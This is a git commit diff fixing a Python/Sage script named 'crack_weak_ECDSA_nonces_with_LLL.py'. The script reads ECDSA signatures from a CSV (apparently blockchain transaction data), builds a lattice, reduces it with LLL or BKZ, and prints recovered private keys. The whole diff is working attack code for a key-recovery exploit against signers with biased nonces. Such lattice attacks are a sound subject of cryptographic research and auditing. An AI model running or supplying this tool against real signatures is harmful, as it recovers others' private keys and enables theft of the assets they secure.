3403139380f5e3b7ae8d19a74f76be0b07c13716
dclavijo <clavijodario@gmail.com>
2022-09-07 15:59:23 -0300

    Fixed script

--- crack_weak_ECDSA_nonces_with_LLL.py
+++ crack_weak_ECDSA_nonces_with_LLL.py
@@ -27,9 +27,8 @@ def load_csv(filename, limit = None):
   if limit == None:
     limit = -1
   for line in fp:
-    if (limit == -1) or (n < limit)) :
+    if (limit == -1) or (n < limit):
       l = line.rstrip().split(",")
-      #sys.stderr.write(str(l)+"\n")
       tx,R,S,Z,pub = l
       msgs.append(int(Z,16))
       sigs.append((int(R,16),int(S,16)))
@@ -38,23 +37,21 @@ def load_csv(filename, limit = None):
   return msgs,sigs,pubs
 
 
-def make_matrix(msgs,sigs,pubs):
+def make_matrix(msgs, sigs, pubs, B):
   m = len(msgs)
   sys.stderr.write("Using: %d sigs...\n" % m)
-  matrix = Matrix(QQ,m+2, m+2)
+  matrix = Matrix(QQ, m + 2, m + 2)
 
   msgn, rn, sn = [msgs[-1], sigs[-1][0], sigs[-1][1]]
   rnsn_inv = rn * modular_inv(sn, order)
   mnsn_inv = msgn * modular_inv(sn, order)
 
   for i in range(0,m):
-    #matrix.append([0] * i + [order] + [0] * (m-i+1))
     matrix[i,i] = order
 
   for i in range(0,m):
     x0=(sigs[i][0] * modular_inv(sigs[i][1], order)) - rnsn_inv
     x1=(msgs[i] * modular_inv(sigs[i][1], order)) - mnsn_inv
-    #print(m,i,x0,x1)
     matrix[m+0,i] = x0
     matrix[m+1,i] = x1
  
@@ -66,20 +63,17 @@ def make_matrix(msgs,sigs,pubs):
   return matrix
 
 
-def privkeys_from_reduced_matrix(m):
+def privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix):
   keys=[]
-  for row in m:
+  msgn, rn, sn = [msgs[-1], sigs[-1][0], sigs[-1][1]]
+  for row in matrix:
     potential_nonce_diff = row[0]
-    #print (potential_nonce_diff)
-    # Secret key = (rns1 - r1sn)-1 (snm1 - s1mn - s1sn(k1 - kn))
     potential_priv_key = (sn * msgs[0]) - (sigs[0][1] * msgn) - (sigs[0][1] * sn * potential_nonce_diff)
     try:
       potential_priv_key *= modular_inv((rn * sigs[0][1]) - (sigs[0][0] * sn), order)
-
       key = potential_priv_key % order
       if key not in keys:
         keys.append(key)
-
     except Exception as e:
       sys.stderr.write(str(e)+"\n")
       pass
@@ -89,7 +83,6 @@ def privkeys_from_reduced_matrix(m):
 def display_keys(keys):
   for key in keys:
     sys.stdout.write("%064x\n" % key)
-    #sys.stderr.write("%064x\n" % key)
   sys.stdout.flush()
   sys.stderr.flush()
 
@@ -101,15 +94,14 @@ def main():
   run_mode = "LLL"
 
   msgs,sigs,pubs = load_csv(filename, limit = limit)
-  
-  matrix = make_matrix(msgs,sigs,pubs)
+  matrix = make_matrix(msgs, sigs, pubs, B)
 
   if run_mode == "LLL":
     new_matrix = matrix.LLL(early_red=True, use_siegel=True)
-    keys = privkeys_from_reduced_matrix(new_matrix)
+    keys = privkeys_from_reduced_matrix(msgs, sigs, pubs, new_matrix)
   else:
     new_matrix = matrix.BKZ(early_red=True, use_siegel=True)
-    keys = privkeys_from_reduced_matrix(new_matrix)
+    keys = privkeys_from_reduced_matrix(msgs, sigs, pubs, new_matrix)
 
   display_keys(keys)
   
